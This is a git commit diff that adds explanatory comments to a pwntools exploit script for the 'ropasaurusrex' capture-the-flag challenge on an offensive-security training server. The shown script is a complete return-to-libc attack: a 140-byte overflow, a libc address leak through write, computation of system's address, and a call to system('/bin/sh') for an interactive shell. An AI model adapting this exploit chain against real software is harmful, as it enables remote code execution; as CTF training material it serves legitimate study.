fc032520c5891d9b1dad1e57d6cd6128269a652b
superuser <hiimgiulio@gmail.com>
2024-01-10 23:07:41 +0100

    ropasaurusrex comments

--- rop/ropasaurusrex/script.py
+++ rop/ropasaurusrex/script.py
@@ -22,19 +22,12 @@ if args["REMOTE"]:
 	r = remote("bin.training.offdef.it", 2014)
 else:
 	r = process("./ropasaurusrex")
-#	gdb.attach(r, """
-#	# dopo la read b *0x0804841b 
-#	b *0x80483f4
-#    unset env
-#    set disable-randomization off	
-#    c
-#	""")
 
 read_plt = 0x804832c
 read_got = 0x0804961c
 write_plt = 0x0804830c
 main = 0x804841d
-data = 0x08049620
+data = 0x08049620 # pointer in memory for reading and writing, idk the program for what it uses it but its valid for me
 pop_esi_edi_ebp = 0x80484b6
 pop_eax_ebx_leave = 0x80482e8
 gadget = pop_esi_edi_ebp
@@ -42,17 +35,20 @@ gadget = pop_esi_edi_ebp
 input("wait")
 time.sleep(0.5)
 
+# write to stdout the libc leak of read and rewind main
 r.send(b"a"*140 + p32(write_plt) + p32(gadget) + p32(0x01) + p32(read_got) + p32(0x4) + p32(main))
 time.sleep(0.2)
 read_libc = u32(r.recv(4))
 print("read_libc: ", hex(read_libc))
-system_libc = read_libc - 0xc1f70
+system_libc = read_libc - 0xc1f70 # calculate offset to system
 print("system_libc: ", hex(system_libc))
 
+# read the string and put it in data
 r.send(b"a"*140 + p32(read_libc) + p32(gadget) + p32(0x00) + p32(data) + p32(0x08) + p32(main))
 time.sleep(0.2)
 r.send(b"/bin/sh\x00")
 
+# call system
 r.send(b"a"*140 + p32(system_libc) + p32(0x00) + p32(data))
 
 r.interactive()
